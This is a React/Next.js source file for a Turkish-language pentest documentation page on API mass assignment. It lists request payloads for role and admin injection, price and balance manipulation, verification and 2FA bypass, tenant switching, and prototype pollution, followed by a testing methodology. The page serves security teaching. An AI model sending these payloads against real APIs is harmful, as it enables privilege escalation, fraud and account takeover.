"use client"

import { motion } from "framer-motion"
import { Server, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function MassAssignmentPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
          <Server className="w-4 h-4" />
          <span>API Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">Mass Assignment</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          API&apos;nin client tarafından gelen tüm parametreleri kabul edip model&apos;e bind etmesi.
          Privilege escalation, data manipulation ve business logic bypass&apos;a yol açar.
        </p>
      </motion.div>

      <Callout type="warning" title="Yaygın Zafiyet">
        Framework&apos;lerin otomatik binding özelliği (Rails strong params, Django ModelForm)
        düzgün konfigüre edilmezse mass assignment oluşur.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Role / Privilege Escalation</h2>
        <PayloadList
          title="Role Injection Payloads"
          initialShow={8}
          payloads={[
            { code: `{"username":"test","role":"admin"}`, note: "Direct role injection" },
            { code: `{"username":"test","isAdmin":true}`, note: "Boolean admin flag" },
            { code: `{"username":"test","is_staff":true}`, note: "Staff flag (Django)" },
            { code: `{"username":"test","is_superuser":true}`, note: "Superuser flag (Django)" },
            { code: `{"username":"test","user_type":"administrator"}`, note: "User type" },
            { code: `{"username":"test","permissions":["*"]}`, note: "Wildcard permission" },
            { code: `{"username":"test","group":"admins"}`, note: "Group injection" },
            { code: `{"username":"test","access_level":99}`, note: "Numeric access level" },
            { code: `{"username":"test","role_id":1}`, note: "Role ID (admin = 1)" },
            { code: `{"username":"test","privilege":"root"}`, note: "Privilege field" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Financial Manipulation</h2>
        <PayloadList
          title="Price/Balance Payloads"
          initialShow={8}
          payloads={[
            { code: `{"item":"product","price":0}`, note: "Fiyatı sıfırlama" },
            { code: `{"item":"product","price":-100}`, note: "Negatif fiyat" },
            { code: `{"item":"product","discount":100}`, note: "%100 indirim" },
            { code: `{"item":"product","quantity":1,"total":0}`, note: "Total override" },
            { code: `{"user":"me","balance":999999}`, note: "Bakiye manipulation" },
            { code: `{"user":"me","credits":99999}`, note: "Kredi ekleme" },
            { code: `{"order_id":"123","status":"refunded"}`, note: "Refund status" },
            { code: `{"subscription":"premium","trial_end":"2099-12-31"}`, note: "Trial süresini uzatma" },
            { code: `{"coupon":"DISCOUNT50","discount_percent":100}`, note: "Kupon manipülasyonu" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Account Manipulation</h2>
        <PayloadList
          title="Account Property Payloads"
          initialShow={8}
          payloads={[
            { code: `{"email":"test@test.com","verified":true}`, note: "Email verification bypass" },
            { code: `{"email":"test@test.com","email_confirmed":true}`, note: "Email confirmation bypass" },
            { code: `{"user":"test","account_status":"active"}`, note: "Account aktivasyonu" },
            { code: `{"user":"test","banned":false}`, note: "Ban bypass" },
            { code: `{"user":"test","2fa_enabled":false}`, note: "2FA devre dışı" },
            { code: `{"user":"test","password_reset_required":false}`, note: "Password reset bypass" },
            { code: `{"user":"test","login_attempts":0}`, note: "Login attempt reset" },
            { code: `{"user":"test","org_id":"target_org"}`, note: "Organization değiştirme" },
            { code: `{"user":"test","tenant_id":"other_tenant"}`, note: "Multi-tenant bypass" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Framework-Specific</h2>
        <PayloadList
          title="Framework Payloads"
          initialShow={6}
          payloads={[
            { code: `user[role]=admin`, note: "Rails - bracket notation" },
            { code: `user[admin]=1`, note: "Rails - admin flag" },
            { code: `user.role=admin`, note: "Spring - dot notation" },
            { code: `user[0].role=admin`, note: "Array index notation" },
            { code: `{"__proto__":{"isAdmin":true}}`, note: "Prototype pollution (Node.js)" },
            { code: `{"constructor":{"prototype":{"isAdmin":true}}}`, note: "Constructor pollution" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. Normal request gönderin, response&apos;daki field&apos;ları not edin{"\n"}
        2. Her response field&apos;ını request body&apos;ye ekleyerek deneyin{"\n"}
        3. Özellikle role, admin, verified, balance gibi field&apos;ları hedefleyin{"\n"}
        4. PUT ve PATCH endpoint&apos;lerini farklı field&apos;larla test edin{"\n"}
        5. API dokümantasyonunda gizli field&apos;ları arayın
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/api/bopla" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>BOPLA</span>
        </Link>
        <Link href="/docs/api/rate-limiting" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>Rate Limiting</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
